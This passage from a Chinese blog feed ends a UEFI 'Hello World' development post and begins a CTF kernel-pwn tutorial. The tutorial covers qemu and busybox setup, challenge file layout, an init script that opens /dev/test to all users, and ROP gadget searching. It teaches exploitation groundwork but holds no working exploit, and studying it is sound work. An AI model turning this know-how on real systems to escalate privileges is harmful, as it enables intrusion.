SetVirtualAddressMap;</span><br><span class="line">        <span class="type">void</span>*                           ConvertPointer;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>*                           GetVariable;</span><br><span class="line">        <span class="type">void</span>*                           GetNextVariableName;</span><br><span class="line">        <span class="type">void</span>*                           SetVariable;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>*                           GetNextHighMonotonicCount;</span><br><span class="line">        EFI_RESET_SYSTEM                ResetSystem;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>*                           UpdateCapsule;</span><br><span class="line">        <span class="type">void</span>*                           QueryCapsuleCapabilities;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>*                           QueryVariableInfo;</span><br><span class="line">&#125; EFI_RUNTIME_SERVICES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        EFI_TABLE_HEADER                Hdr;</span><br><span class="line"></span><br><span class="line">        <span class="type">void</span>*                           FirmwareVendor;</span><br><span class="line">        UINT32                          FirmwareRevision;</span><br><span class="line">        <span class="type">void</span>*                           ConsoleInHandle;</span><br><span class="line">        EFI_SIMPLE_TEXT_INPUT_PROTOCOL  *ConIn;</span><br><span class="line">        <span class="type">void</span>*                           ConsoleOutHandle;</span><br><span class="line">        EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *ConOut;</span><br><span class="line">        <span class="type">void</span>*                           StandardErrorHandle;</span><br><span class="line">        <span class="type">void</span>*                           StdErr;</span><br><span class="line">        EFI_RUNTIME_SERVICES            *RuntimeServices;</span><br><span class="line">        <span class="type">void</span>*                           BootServices;</span><br><span class="line">        UINTN                           NumberOfTableEntries;</span><br><span class="line">        <span class="type">void</span>*                           ConfigurationTable;</span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure><h2 id="efic编写"><a class="markdownIt-Anchor" href="#efic编写"></a> efi.c编写</h2><ul><li>然后再查看<code>efi.c</code>这个代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;efi.h&quot;</span></span></span><br><span class="line">EFI_STATUS EFIAPI <span class="title function_">efi_main</span><span class="params">(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)</span> &#123;</span><br><span class="line">        (<span class="type">void</span>)ImageHandle;</span><br><span class="line"></span><br><span class="line">        SystemTable-&gt;ConOut-&gt;SetAttribute(SystemTable-&gt;ConOut,</span><br><span class="line">                EFI_TEXT_ATTR(EFI_YELLOW,EFI_GREEN));</span><br><span class="line"></span><br><span class="line">        SystemTable-&gt;ConOut-&gt;ClearScreen(SystemTable-&gt;ConOut);</span><br><span class="line"></span><br><span class="line">        SystemTable-&gt;ConOut-&gt;OutputString(SystemTable-&gt;ConOut, <span class="string">u&quot;Hello, World!\r\n\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SystemTable-&gt;ConOut-&gt;SetAttribute(SystemTable-&gt;ConOut,</span><br><span class="line">                        EFI_TEXT_ATTR(EFI_RED,EFI_BLACK));</span><br><span class="line">        SystemTable-&gt;ConOut-&gt;OutputString(SystemTable-&gt;ConOut,</span><br><span class="line">                        <span class="string">u&quot;Press any key to shutdown...&quot;</span>);</span><br><span class="line">        EFI_INPUT_KEY key;</span><br><span class="line">        <span class="keyword">while</span> (SystemTable-&gt;ConIn-&gt;ReadKeyStroke(SystemTable-&gt;ConIn,&amp;key) != EFI_SUCCESS)</span><br><span class="line">                ;</span><br><span class="line">        SystemTable-&gt;RuntimeServices-&gt;ResetSystem(EfiResetShutdown, EFI_SUCCESS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="makefile编写"><a class="markdownIt-Anchor" href="#makefile编写"></a> makefile编写</h2><ul><li>编写好着两个代码后，我们就可以创建一个<code>makefile</code>，向该文件写入如下内容，其中<code>--subsystem,10</code>这个参数需要在<code>MinGW 链接器</code>版本在<code>v2.36</code>版本及以上才能使用：</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">gcc:</span></span><br><span class="line">        x86_64-w64-mingw32-gcc efi.c \</span><br><span class="line">        -std=c17   \</span><br><span class="line">        -Wall      \</span><br><span class="line">        -Wextra    \</span><br><span class="line">        -Wpedantic \</span><br><span class="line">        -mno-red-zone \</span><br><span class="line">        -ffreestanding \</span><br><span class="line">        -nostdlib \</span><br><span class="line">        -Wl,--subsystem,10 \</span><br><span class="line">        -e efi_main \</span><br><span class="line">        -o BOOTX64.EFI</span><br></pre></td></tr></table></figure><h2 id="其他步骤"><a class="markdownIt-Anchor" href="#其他步骤"></a> 其他步骤</h2><ul><li>编译好后我们就会生成一个<code>BOOTX64.EFI</code>这个<code>PE</code>文件</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319231748420.png" alt="image-20250319231748420"></p><ul><li>然后我们将使用<code>cp</code>命令，将<code>BOOTX64.EFI</code>这个文件复制一份到<code>UEFI-GPT-image-creator</code>这个目录下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> ./BOOTX64.EFI ./UEFI-GPT-image-creator/</span><br></pre></td></tr></table></figure><ul><li>然后我们进入到<code>UEFI-GPT-image-creator</code>文件下，使用<code>./write_gpt</code>，就可以将<code>BOOTX64.EFI</code>写入到<code>GPT</code>格式的磁盘中。</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319232020910.png" alt="image-20250319232020910"></p><ul><li>之后我们就使用<code>sh</code>脚本，运行<code>qemu</code>来模拟<code>UEFI</code>的运行</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-drive format=raw,unit=0,file=test.hdd \</span><br><span class="line">-bios ../bios64.bin \</span><br><span class="line">-m 256M \</span><br><span class="line">-vga std \</span><br><span class="line">-name TESTOS \</span><br><span class="line">-machine q35 \</span><br><span class="line">-net none</span><br></pre></td></tr></table></figure><ul><li>运行后具体效果如下：</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250319232130065.png" alt="image-20250319232130065"></p><h1 id="efih和efic详解"><a class="markdownIt-Anchor" href="#efih和efic详解"></a> efi.h和efi.c详解</h1><ul><li>按顺序我们应该先搞清楚<code>efi.h</code>这个文件中的内容，然后再搞清楚<code>efi.c</code>中的内容。</li></ul>]]></content>
    
    
    <summary type="html">前言：没有开发基础的安全，不是好安全.</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="UEFI开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/UEFI%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>内核pwn入门</title>
    <link href="http://iyheart.github.io/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/"/>
    <id>http://iyheart.github.io/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/</id>
    <published>2025-05-03T00:09:01.000Z</published>
    <updated>2025-05-29T14:08:23.532Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>参考文章：<a href="https://bbs.kanxue.com/thread-276403.htm">https://bbs.kanxue.com/thread-276403.htm</a></p></li><li><p>参考文章：<a href="https://www.cnblogs.com/unr4v31/p/15725128.html">https://www.cnblogs.com/unr4v31/p/15725128.html</a></p></li><li><p>参考文章：<a href="https://x1ng.top/2020/12/22/kernel-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF-%E4%B8%80/">https://x1ng.top/2020/12/22/kernel-pwn入门之路-一/</a></p></li><li><p>五一之前做了一下GHCTF2024的内核入门题，好像有点摸到门道了</p></li></ul><h1 id="前提介绍"><a class="markdownIt-Anchor" href="#前提介绍"></a> 前提介绍</h1><h2 id="内核与用户pwn的区别"><a class="markdownIt-Anchor" href="#内核与用户pwn的区别"></a> 内核与用户pwn的区别</h2><ul><li>内核pwn和用户pwn的区别如下：<ul><li><strong>获取权限</strong>：最大的区别就是用户的pwn是拼凑<code>system('/bin/sh')</code>，这样以后就可以<code>getshell</code>。而内核的pwn是提权，各种操作后将Linux的操作权限从用户变成root权限。</li><li><strong>代码量</strong>：用户pwn大多都对程序进行攻击，内核的pwn是对操作系统的内核，攻击对象由<strong>程序</strong>这层转变为<strong>操作系统</strong>这层。这就意味着需要阅读内核代码，这代码量往往比用户pwn大得多。也需要更扎实的操作系统理论知识。</li><li><strong>保护机制</strong>：内核的保护机制也和程序的保护机制用差别。</li></ul></li></ul><h2 id="内核pwn的题型"><a class="markdownIt-Anchor" href="#内核pwn的题型"></a> 内核pwn的题型</h2><ul><li>内核pwn主要是寻找偏硬件的程序漏洞。接下来就对内核pwn的题型进行初步的分类。</li><li>我们一般入门都是先对<code>/dev</code>目录下的设备驱动进行利用，并且<code>CTF</code>关于内核的出题一般来说就是出<code>/dev</code>目录下面的题目。</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250529220821883.png" alt="image-20250529220821883"></p><ul><li>而如果按照漏洞造成的结果，内核漏洞就可以简单分为如下三类：<code>提权</code>、<code>内核任意执行</code>、<code>逃逸</code></li></ul><h1 id="内核pwn环境搭建"><a class="markdownIt-Anchor" href="#内核pwn环境搭建"></a> 内核pwn环境搭建</h1><ul><li>接下来就来安装一下内核pwn利用的相关调试环境。</li></ul><h2 id="qemu的安装"><a class="markdownIt-Anchor" href="#qemu的安装"></a> qemu的安装</h2><ul><li>在内核<code>pwn</code>题中会出现一个<code>.sh</code>脚本，这个脚本用<code>qemu</code>使用的题目的内核程序。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;./bzImage&quot;</span> \</span><br><span class="line">    -initrd  <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet FLAG=<span class="variable">$FLAG</span>&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><ul><li>所以我们需要使用<code>qemu</code>这个虚拟化软件，这样我们就可以在本地中启动题目给的内核脚本文件。</li><li>接下来使用如下命令安装qemu程序。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-system-x86</span><br></pre></td></tr></table></figure><ul><li>安装完之后运行如下命令查看一下<code>qemu</code>是否安装完成</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 --version</span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504174911806.png" alt="image-20250504174911806"></p><h2 id="busbox文件系统"><a class="markdownIt-Anchor" href="#busbox文件系统"></a> busbox文件系统</h2><ul><li><p>选择使用<code>busbox</code>作为内核调试的文件系统环境有以下几点好处：</p><ul><li><p>当做内核开发和研究的时候，并不需要准备完备的文件系统，那样太复杂也很占存储空间，busybox对于kernel开发和调试来说正好合适</p></li><li><p>当进行跨平台内核调试时，用完备的ext4系统，运行非常慢，busybox主要是为了嵌入式之类的运算能力弱的设备</p></li><li><p>qemu-system的纯软件模拟非常慢，busybox刚好合适</p></li></ul></li><li><p>可以直接选择包管理器一键安装</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install busybox</span><br></pre></td></tr></table></figure><ul><li>也可以选择下载源码后本地编译安装(建议：busybox默认是动态编译，但是这里需要的是静态编译，如果动态编译的话会让文件系统变得很大)</li><li>先下载一下编译需要的依赖</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install build-essential libncurses-dev bison flex</span><br></pre></td></tr></table></figure><ul><li>然后使用命令去官网上下载busybox源码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2</span><br></pre></td></tr></table></figure><ul><li>下载之后解压缩文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xjf busybox-1.36.1.tar.bz2</span><br><span class="line"><span class="built_in">cd</span> busybox-1.36.1</span><br></pre></td></tr></table></figure><ul><li><p>然后进行编译安装<code>make xxxxxconfig</code>，busybox提供了几种编译配置</p><ul><li><p>defconfig（默认配置）</p></li><li><p>allyesconfig（最大配置）</p></li><li><p>allnoconfig（最小配置）</p></li><li><p>这里我们一般选择默认配置</p></li></ul></li><li><p>然后是<code>make menuconfig</code>，选择静态编译，当你认为上述配置中还有不满意的地方，可以进行微调，加入或去除某些命令。<code>make menuconfig</code>进入后选择安装位置，进入设置</p></li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504180347456.png" alt="image-20250504180347456"></p><ul><li>选择静态链接</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504180408969.png" alt="image-20250504180408969"></p><ul><li>然后也可以选择这个修改安装目录</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504180422457.png" alt="image-20250504180422457"></p><ul><li>选择保存你所选择的配置</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504180432419.png" alt="image-20250504180432419"></p><ul><li>最后就是编译安装了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在x86_64下只要输入该指令即可：make -j4</span><br><span class="line">如果要使用ARM64编译的话需要输入指令make -j4 CROSS_COMPILE=aarch64-linux-gnu-</span><br></pre></td></tr></table></figure><ul><li>编译好了之后进行安装</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><ul><li>安装好后找到你之前配置的安装路径</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20250504180533864.png" alt="image-20250504180533864"></p><h1 id="内核pwn附件介绍"><a class="markdownIt-Anchor" href="#内核pwn附件介绍"></a> 内核pwn附件介绍</h1><ul><li><p>内核pwn不同于用户模式下的pwn，用户模式下的pwn最多给三个文件，<code>ld</code>、<code>libc</code>、<code>程序</code>，而内核pwn给的文件就有点多。</p></li><li><p>以2024年9月的长城杯一个内核pwn的题目做介绍，刚好试试能不能复现一下。</p></li><li><p>附件如下：<a href="https://wwsq.lanzoue.com/iZCI929l3qli">https://wwsq.lanzoue.com/iZCI929l3qli</a>  密码:ghfb</p></li><li><p>题目给的附件结构如下：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── start.sh     <span class="comment"># 启动脚本，运行这个脚本来启动QEMU</span></span><br><span class="line">├── bzImage      <span class="comment"># 压缩过的内核镜像(这个是真正的编译后的内核程序)</span></span><br><span class="line">└── rootfs.cpio  <span class="comment"># 作为初始RAM磁盘的文件,这里面的文件如下。注：这里只列出比较重要的文件，具体的看题目附件</span></span><br><span class="line">|----init    <span class="comment"># init是系统启动时执行的第一个用户态进程（PID 1）。它是操作系统启动流程的核心部分，负责初始化系统并启动其他进程。这个init是比较重要的</span></span><br><span class="line">|----linuxrc  <span class="comment"># linuxrc通常是一个脚本或可执行文件，它在一些早期的Linux版本中被用作默认的启动脚本，类似于init。 </span></span><br><span class="line">|----user <span class="comment"># 这个多说</span></span><br><span class="line">|----sbin <span class="comment"># sbin是“system binary”的缩写，通常包含系统管理员使用的二进制文件。</span></span><br><span class="line">|----lib <span class="comment"># lib目录中的文件通常是为了支持基本命令和脚本运行所需的最小化库文件。</span></span><br><span class="line">|---- .....</span><br><span class="line">|---- test.ko <span class="comment"># .ko表示的是内核模块，这个后面会具体介绍</span></span><br><span class="line">|----dev <span class="comment"># 设备文件</span></span><br><span class="line">|----bin <span class="comment"># bin目录通常包含一些基本的用户级二进制文件和命令</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909173723116.png" alt="image-20240909173723116"></p><h2 id="内核文件bzlmage"><a class="markdownIt-Anchor" href="#内核文件bzlmage"></a> 内核文件–bzlmage</h2><ul><li><p>bzlmage这个还是比较熟悉的，之前在重新编译wsl内核的时候看见过该程序，大概知道这个是内核，但是还没具体了解</p></li><li><p><code>bzlmage</code>这个是压缩后的Linux内核的镜像文件，它是一种大于传统的<code>zImage</code>格式的内核镜像。</p><ul><li><code>bzImage</code> 是 Linux 内核的引导镜像，用于引导系统启动。</li><li>在内核pwn中，如果要开发一个远程漏洞利用脚本，理解 <code>bzImage</code> 的结构和启动过程可能会有助于理解漏洞的触发条件以及内核的内存布局。</li><li>可能会要对 <code>bzImage</code> 进行逆向，以深入分析内核的行为、检测安全漏洞。</li><li>使用<code>balmage</code>是比较难找gadget，这时候需要使用工具将该压缩后的内核文件解压成<code>vmlinux</code>文件，可以使用ropper在提取的vmlinux中搜寻gadget，ropper比ROPgadget快很多，所以需要安装<strong>ropper</strong></li><li>将<code>bzlmage</code>这个提取出<code>vmlinux</code>的工具网站如下。<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux%EF%BC%8C%E6%8F%90%E5%8F%96%E6%93%8D%E4%BD%9C%E5%9C%A8%E4%B8%8B%E9%9D%A2">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux，提取操作在下面</a></li></ul></li><li><p><code>vmlinux</code>是未压缩的Linux内核映像，包含完整的内核代码段和数据段。</p><ul><li>通常包含调试符号，能够通过<code>gdb</code>等调试器加载进行符号化调试。</li><li>可以直接通过ROP工具或手动查找gadget，比如用<code>ROPgadget</code>、<code>ROPg</code>等工具搜索gadgets。</li></ul></li></ul><h2 id="启动脚本-startsh"><a class="markdownIt-Anchor" href="#启动脚本-startsh"></a> <a href="http://xn----start-lm1lp7i5x9dhv9c.sh">启动脚本--start.sh</a></h2><ul><li>start.sh其实就是一些qemu的启动命令。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \  <span class="comment"># 参数设置RAM大小为64M</span></span><br><span class="line">    -kernel bzImage \     <span class="comment"># 使用当前目录的bzImage作为内核镜像</span></span><br><span class="line">    -initrd rootfs.cpio \ <span class="comment"># 指定使用rootfs.cpio作为初始RAM磁盘。可以使用cpio 命令提取这个cpio文件，提取出里面的需要的文件，比如init脚本和babydriver.ko的驱动文件。提取操作的命令放在下面的操作步骤中</span></span><br><span class="line">    -monitor /dev/null \  <span class="comment"># 将监视器重定向到字符设备/dev/null</span></span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">    -nographic \   <span class="comment"># 参数禁用图形输出并将串行I/O重定向到控制台</span></span><br><span class="line">    -no-reboot \  <span class="comment"># 发生重启时不要自动重启虚拟机</span></span><br><span class="line">    -no-shutdown   <span class="comment"># 在虚拟机发出关闭信号（例如通过操作系统的关机命令）时不要自动关闭虚拟机。</span></span><br></pre></td></tr></table></figure><ul><li>给这个脚本附加权限<code>chmod +x start.sh</code>后然后运行这个脚本就可以启动该内核环境</li></ul><p><img src="/2025/05/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/3.%E5%86%85%E6%A0%B8%E7%B3%BB%E5%88%97/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/image-20240909180616067.png" alt="image-20240909180616067"></p><h2 id="初始ram磁盘文件rootfscpio"><a class="markdownIt-Anchor" href="#初始ram磁盘文件rootfscpio"></a> 初始RAM磁盘文件–rootfs.cpio</h2><ul><li>这个文件与内核文件一样重要，这里面也存在几个很重要的文件</li><li>之后会介绍如何将一个文件夹打包成这个文件，因为我们需要将静态编译好的用c语言写的<code>exp</code>文件放入这个文件中，然后再打包这个文件，学会打包这个文件是很重要的</li><li>下面先介绍几个比较重要的文件（可能不全，还需要待补充）</li></ul><h3 id="初始化文件init"><a class="markdownIt-Anchor" href="#初始化文件init"></a> 初始化文件–init</h3><ul><li><p><code>init</code>文件是系统启动时执行的第一个用户空间进程（PID 1）。它负责初始化系统，设置环境并启动其他进程。对<code>init</code>文件的分析可以帮助你理解系统的启动流程和配置。</p></li><li><p><code>init</code>文件中包含的脚本和命令决定了系统如何挂载文件系统、设置网络、启动服务等。这些操作通常涉及到与内核的交互，并可能暴露潜在的漏洞或不安全的配置。</p></li><li><p>通过分析<code>init</code>文件，你可以获得有关如何启动和配置系统的信息。这些信息有助于你确定如何在内核或内核模块中寻找潜在的漏洞。</p></li><li><p>接下来我们来看一下<code>init</code>这个文件里面的内容</p><ul><li>从init里面的内容就可以比较快速的找出一些漏洞比如<ul><li><code>test.ko</code> 模块的代码和 <code>/dev/test</code> 设备的权限配置可能包含可利用的安全漏洞。</li><li>并且知道了该系统启动时是以uid为1000的用户身份，而不是root身份</li></ul></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh          # 指定该脚本应该由 /bin/sh 解释器执行。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># mkdir是创建目录</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp   <span class="comment"># 用于临时文件存储。</span></span><br><span class="line"><span class="built_in">mkdir</span> /proc   <span class="comment"># 用于显示内核和系统信息。</span></span><br><span class="line"><span class="built_in">mkdir</span> /sys     <span class="comment"># 用于显示和管理设备信息和系统状态。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mount是挂载命令</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line"></span><br><span class="line">insmod /lib/modules/5.10.0-9-generic/kernel/test.ko  <span class="comment"># 使用 insmod 工具加载内核模块 test.ko。这个模块可能包含漏洞或用于测试的代码。</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/test  <span class="comment"># 修改 /dev/test 设备文件的权限为 666，即所有用户都可以读写。这个设备文件是由前面加载的内核模块创建的。</span></span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh  <span class="comment"># 以 setuid 用户（UID 为 1000）身份启动一个新的 shell (/bin/sh)。setsid 命令会创建一个新的会话，cttyhack 确保新 shell 在控制终端上运行。</span></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f  <span class="comment"># 强制系统关机。-d 0 表示关机延迟为 0 秒，-f 表示强制关机。</span></span><br></pre></td></tr></table></figure><h3 id="内核模块testko目前"><a class="markdownIt-Anchor" href="#内核模块testko目前"></a> 内核模块–test.ko（目前）</h3><ul><li><code>.ko</code>文件表示这是一个可加载的内核对象文件，通常用于扩展内核的功能而不需要重新编译整个内核<ul><li><strong>基本作用</strong>：内核模块可以增加内核的功能，如支持新的硬件设备、文件系统、网络协议等。</li><li><strong>作为驱动</strong>：<code>.ko</code> 文件是设备驱动程序，它们允许操作系统与硬件设备进行交互。</li></ul></li></ul><h1 id="解压bzlmage"><a class="markdownIt-Anchor" href="#解压bzlmage"></a> 解压bzlmage</h1><ul><li>先在linux下，先使用wget拉取该仓库里面的内容</li></ul><figure class="highlight 